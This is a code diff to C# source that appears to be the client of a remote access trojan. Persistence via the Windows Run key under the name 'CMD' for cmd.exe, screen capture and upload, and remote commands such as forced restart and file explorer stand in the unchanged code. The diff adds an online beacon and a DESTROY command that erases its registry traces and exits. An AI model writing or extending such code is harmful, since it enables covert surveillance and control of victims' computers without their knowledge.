@@ -76,12 +76,10 @@ namespace cmd
 
             if (isChecked)
             {
-                // Đăng ký stratup cùng Windows
                 registryKey.SetValue("CMD", Directory.GetCurrentDirectory() + "\\cmd.exe");
             }
             else
             {
-                // Hủy đăng ký
                 registryKey.DeleteValue("CMD");
             }
         }
@@ -112,6 +110,17 @@ namespace cmd
             }
 
             return userID;
+        }
+
+        private void destroy()
+        {
+            RegisterInStartup(false);
+            RegistryKey key = Registry.CurrentUser.OpenSubKey("Software");
+
+            if (key != null)
+            {
+                key.DeleteSubKey("control");
+            }
         }
 
         private int registerUserID()
@@ -262,11 +271,11 @@ namespace cmd
 
                     screenGraphics.CopyFromScreen(0, 0,
                                             0, 0, screenBitmap.Size, CopyPixelOperation.SourceCopy);
-                    screenBitmap.Save(@"d:\bit.jpg", ImageFormat.Jpeg);
+                    screenBitmap.Save(@"bit.jpg", ImageFormat.Jpeg);
 
                 }
 
-                return @"d:\bit.jpg";
+                return @"bit.jpg";
             }
             catch (Exception e)
             {
@@ -305,7 +314,8 @@ namespace cmd
                 //MessageBox.Show(html);
                 sendCommand("VIEWSCREEN");
 
-            } catch(Exception e)
+            }
+            catch (Exception e)
             {
                 sendCommand("MBOX " + e.Message);
             }
@@ -354,6 +364,15 @@ namespace cmd
                 else if (cmd.ToUpper().StartsWith("RESTART"))
                 {
                     Process.Start(@"C:\Windows\System32\cmd.exe", "/c shutdown -r -f -t 0");
+                }
+                else if (cmd.ToUpper().StartsWith("ONLINE"))
+                {
+                    sendCommand("ONLINE " + userID);
+                }
+                else if (cmd.ToUpper().StartsWith("CLOSECHATBOX"))
+                {
+                    if (chatWindow != null)
+                        chatWindow.Hide();
                 }
                 else if (cmd.ToUpper().StartsWith("FILEEXPLORER"))
                 {
@@ -416,6 +435,12 @@ namespace cmd
                 else if (cmd.ToUpper().StartsWith("VIEWSCREEN"))
                 {
                     uploadFileAsync(takeScreen());
+
+                }
+                else if (cmd.ToUpper().StartsWith("DESTROY"))
+                {
+                    destroy();
+                    Environment.Exit(0);
 
                 }
             }
